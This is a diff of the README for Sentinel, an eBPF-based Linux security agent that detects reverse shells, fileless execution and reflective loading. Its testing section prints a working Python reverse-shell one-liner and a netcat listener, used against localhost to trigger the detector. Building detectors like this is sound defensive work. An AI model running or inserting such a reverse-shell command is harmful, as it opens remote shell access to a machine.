@@ -2,112 +2,124 @@
 
 # 🛡️ Sentinel
 
-### eBPF Observability & Security MVP
-
-[![Rust](https://img.shields.io/badge/Language-Rust-orange.svg?logo=rust)](https://www.rust-lang.org/)
-[![Platform](https://img.shields.io/badge/Platform-Linux-blue.svg?logo=linux)](https://www.kernel.org/)
-[![Tech](https://img.shields.io/badge/Technology-eBPF-green.svg?logo=linux)](https://ebpf.io/)
+[![Rust](https://img.shields.io/badge/Language-Rust-orange.svg)](https://www.rust-lang.org/)
+[![eBPF](https://img.shields.io/badge/Tech-eBPF-blue.svg)](https://ebpf.io/)
+[![Aya](https://img.shields.io/badge/Library-Aya-green.svg)](https://aya-rs.dev/)
+[![Linux](https://img.shields.io/badge/OS-Linux-lightgrey.svg)]()
 [![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-
-[**Installation**](#-installation) • [**Architecture**](#-architecture) • [**Techniques**](#-detection-techniques--status)
 
 </div>
 
----
+**Sentinel** is a stateful security observability agent powered by eBPF (Extended Berkeley Packet Filter).
 
-**Sentinel** is an experimental security observability tool built to explore the capabilities of **eBPF (Extended Berkeley Packet Filter)** on Linux.
+Unlike traditional EDRs that rely on heavy kernel modules, Sentinel runs safe, sandboxed bytecode directly in the Linux kernel to trace system behavior. It introduces a **Process Registry** pattern—building a "Digital Twin" of every running process in userspace to correlate isolated syscalls into malicious behavior patterns.
 
-Designed as a "Just for Fun" MVP, this project aims to answer a simple question: *How much visibility can we get into in-memory threats without touching the disk?*
-
-Instead of building a full-blown antivirus, Sentinel serves as a proof-of-concept for kernel-level instrumentation. It hooks specific system calls to track the lifecycle of anonymous files, demonstrating how modern Linux features can be monitored to detect stealthy execution patterns.
+> 🚧 **Status:** Active Research / Portfolio Project
 
 ---
 
-## 🏗️ Architecture
+## 🧠 Architecture
 
-Sentinel operates using a split-architecture design:
-
-1. **Kernel Space (eBPF):** Tiny, safe programs attach to kernel tracepoints to capture raw syscall events.
-2. **User Space (Rust/Tokio):** An asynchronous runtime processes events, maintains state, and correlates actions to detect threats.
+Sentinel moves beyond stateless logging by maintaining a real-time, thread-safe model of system state.
 
 ```mermaid
 graph TD
-    %% Actors
-    Attacker[Attacker]
-
-    %% Kernel Space Subgraph
-    subgraph Kernel["Kernel Space (eBPF)"]
-        direction TB
-        T1(Tracepoint: sys_enter_memfd_create)
-        T2(Tracepoint: sys_enter_execveat)
-        T3(Tracepoint: sys_enter_mmap)
+    subgraph Kernel Space [Linux Kernel]
+        K_Socket[sys_enter_socket] -->|Tracepoint| Probe_Net
+        K_Connect[sys_enter_connect] -->|Tracepoint| Probe_Net
+        K_Dup[sys_enter_dup2] -->|Tracepoint| Probe_IO
+        K_Exec[sys_enter_execve] -->|Tracepoint| Probe_Process
     end
 
-    %% User Space Subgraph
-    subgraph User["User Space (Rust/Tokio)"]
-        direction TB
-        Buffer[(PerfEventArray Ring Buffer)]
-        Loop[Async Event Loop]
-        Tracker[State Tracker HashMap]
-        Alert{🚨 Threat Detection Alert}
+    Probe_Net -->|PerfBuffer| Userspace
+    Probe_IO -->|PerfBuffer| Userspace
+    Probe_Process -->|PerfBuffer| Userspace
+
+    subgraph User Space [Sentinel Agent]
+        Userspace[Event Bus] -->|Dispatch| Registry[Process Registry]
+        Registry -->|Update State| Map[DashMap <PID, Process>]
+        
+        Map -->|Analyze| D1[Reverse Shell Detector]
+        Map -->|Analyze| D2[Fileless Execution Detector]
+        Map -->|Analyze| D3[Reflective Loader Detector]
+        
+        D1 -->|Alert| Logs[Stdout / SIEM]
     end
-
-    %% Connections
-    Attacker -- "Malicious Syscalls" --> T1
-    Attacker --> T2
-    Attacker --> T3
-
-    T1 --> Buffer
-    T2 --> Buffer
-    T3 --> Buffer
-
-    Buffer --> Loop
-    Loop --> Tracker
-    Tracker --> Alert
-
-    %% Styling
-    style Kernel fill:#ffeef0,stroke:#d63031,stroke-width:2px
-    style User fill:#e3f2fd,stroke:#0984e3,stroke-width:2px
-    style Alert fill:#fff,stroke:#d63031,stroke-width:4px,color:#d63031
 
 ```
 
-## 🕵️ Detection Techniques & Status
+### Key Components
 
-Sentinel focuses on "living off the land" techniques and memory-resident threats.
+**`sentinel-ebpf` (Kernel):**
 
-| Status | Technique | Pattern | Description |
-| :--- | :--- | :--- | :--- |
-| ✅ **Implemented** | **Fileless Execution** | `memfd_create` → `execveat` | Detects processes executing directly from anonymous memory (no disk file). |
-| ✅ **Implemented** | **Reflective Loading** | `mmap(PROT_EXEC)` | Detects anonymous memory being mapped as executable (Library Injection). |
-| 🚧 **Backlog** | **Reverse Shells** | `socket` → `dup2` | Detects redirection of shell STDIN/STDOUT to a network socket. |
-| 📋 **Backlog** | **Process Injection** | `ptrace` / `process_vm_writev` | Detects unauthorized code injection into running processes (e.g., SSHD). |
-| 📋 **Backlog** | **Persistence** | `openat(/etc/shadow, ...)` | Detects modification of critical system files (Cron, SSH Keys, Users). |
-| 📋 **Backlog** | **Log Wiping** | `unlinkat(/var/log/*)` | Detects deletion of system logs to cover tracks. |
+* Written in **Rust (no_std)**.
+* Uses **CO-RE** (Compile Once, Run Everywhere) to work across different kernel versions without recompilation.
+* Captures high-velocity syscalls (`socket`, `connect`, `dup2`, `memfd_create`, `mmap`).
 
-## 📂 Project Structure
+**`sentinel-common` (Wire Protocol):**
 
-| Crate | Description |
-| --- | --- |
-| **`sentinel`** | User-space application. Handles the async event loop, state tracking, and alerting logic. |
-| **`sentinel-ebpf`** | Kernel-space code. Defines the tracepoints and eBPF maps loaded into the kernel. |
-| **`sentinel-common`** | Shared library. Defines the TLV (Type-Length-Value) protocol and structs shared between Kernel and User space. |
-| **`sample_attacks`** | Safe malware simulators used to test and verify the detection engine. |
+* Defines strict `#[repr(C)]` structs for binary compatibility between Kernel and User space.
+* Enforces platform-agnostic types (`i32` for PIDs, `[u8; 16]` for IPs) to prevent ABI mismatch.
 
-## 📦 Installation & Usage
+**`sentinel` (User Agent):**
+
+* **Async/Await:** Built on **Tokio** for non-blocking event processing.
+* **Sharded Locking:** Uses `DashMap` and Row-Level `Mutex` locking to ensure tracking PID 100 doesn't block analysis of PID 200.
+
+---
+
+## 🕵️ Detection Capabilities
+
+Sentinel focuses on "Living off the Land" techniques and memory-resident threats.
+
+### 1. Reverse Shell Detection
+
+Detects when an attacker forces a shell to connect back to their machine.
+
+* **Method:** Tracks the lifecycle of File Descriptors (FDs).
+* **Signature:** `socket()` (Create) -> `connect()` (Network) -> `dup2()` (Redirection to STDIN/STDOUT).
+* **Why it works:** Captures the intent (redirection) rather than just the process name, detecting `netcat`, `bash`, `python`, and custom malware shells.
+
+### 2. Fileless Execution (`memfd_create`)
+
+Detects payloads executed directly from RAM without touching the disk.
+
+* **Method:** Hooks `memfd_create` and correlates it with `execveat`.
+* **Signature:** Execution of a file that maps to `/memfd:...` instead of a physical disk path.
+
+### 3. Reflective Loading (`mmap`)
+
+Detects attempts to manually map executable code into memory (Shellcode injection).
+
+* **Method:** Monitors `mmap` syscalls for suspicious protection flags.
+* **Signature:** Memory allocation with `PROT_EXEC | PROT_WRITE` (W^X violation).
+
+---
+
+## 🚀 Getting Started
 
 ### Prerequisites
 
-* Rust Nightly Toolchain (Required for eBPF compilation)
-* `bpf-linker`: `cargo install bpf-linker`
-* A Linux Kernel supporting eBPF (5.4+ recommended)
-
-### Building
-
-To Update he vmlinux.rs link to your current kernel headers, run:
+* **Rust Nightly:** Required for compiling eBPF.
+* **Aya Tool:** For generating kernel bindings.
+* **Linux Kernel:** 5.8+ (for full CO-RE support).
 
 ```bash
-aya-tool generate sockaddr \
+rustup toolchain install nightly
+rustup component add rust-src --toolchain nightly
+cargo install bpf-linker
+cargo install aya-tool
+
+```
+
+### 1. Generate Kernel Bindings
+
+Sentinel uses `vmlinux.rs` to access internal kernel structures (like `sockaddr`). Generate bindings for your specific running kernel:
+
+```bash
+cd sentinel-ebpf
+aya-tool generate src/vmlinux.rs \
+  sockaddr \
   sockaddr_in \
   sockaddr_in6 \
   task_struct \
@@ -115,50 +127,75 @@ aya-tool generate sockaddr \
   inode \
   path \
   dentry \
-  qstr > sentinel-ebpf/src/vmlinux.rs
+  qstr
 
 ```
 
+### 2. Build & Run
+
+Sentinel requires `sudo` (CAP_BPF) to load programs into the kernel.
+
 ```bash
+# In the root directory
 cargo build --release
 
-```
-
-### Running Sentinel
-
-Sentinel requires `sudo` capabilities to load eBPF programs into the kernel.
-
-```bash
-sudo ./target/release/sentinel
+# Run with logging enabled
+RUST_LOG=info sudo -E ./target/release/sentinel
 
 ```
 
 ---
 
-## 🧪 Testing & Verification
+## 🧪 Testing Detections
 
-I have included strictly educational **Malware Simulators** to demonstrate the detection capabilities against real-world attack patterns.
+Sentinel includes a "Malware Simulator" to safely test its capabilities.
 
-### 1. Fileless Execution Attack
+### Simulating a Reverse Shell
 
-Simulates a dropper that writes a binary to memory and executes it directly.
+1. **Terminal 1 (Attacker):** Start a listener.
 
 ```bash
-cargo run --bin fileless
+nc -lvnp 4444
 
 ```
 
-### 2. Reflective Code Loading
-
-Simulates a loader that maps a shared library from memory with executable permissions.
+1. **Terminal 2 (Sentinel):** Start the agent.
 
 ```bash
-cargo run --bin dependency_injection
+RUST_LOG=info sudo -E ./target/release/sentinel
+
+```
+
+1. **Terminal 3 (Victim):** Run the simulator (or a real python reverse shell).
+
+```bash
+# Option A: Built-in Rust simulator
+cargo run --bin malware_simulator
+
+# Option B: Python one-liner
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+
+```
+
+**Expected Output:**
+
+```text
+[INFO] Socket created (FD 3, TCP)
+[INFO] Socket connected: FD 3 -> 127.0.0.1:4444
+[WARN] 🚨 REVERSE SHELL DETECTED! PID: 1234 redirected Socket (FD 3) to STDIO (FD 0)
 
 ```
 
 ---
 
-## ⚖️ License
+## 🔮 Roadmap & Limitations
 
-This project is licensed under the MIT License - see the [LICENSE](https://www.google.com/search?q=LICENSE) file for details.
+* **IPv6 Support:** Currently, the `ReverseShellDetector` analyzes IPv4 headers (`AF_INET`). IPv6 (`AF_INET6`) parsing is planned.
+* **Socket Rehydration:** If Sentinel starts *after* a process has already connected, it misses the `connect` event. Future versions will read `/proc/pid/fd` on startup to rebuild state.
+* **Evasion:** Advanced malware using `fcntl(F_DUPFD)` instead of `dup2` is not yet covered.
+
+---
+
+## 📜 License
+
+This project is dual-licensed under MIT/Apache-2.0, following the standard Rust ecosystem conventions. eBPF components are GPL-2.0 compatible to ensure kernel verifier acceptance.
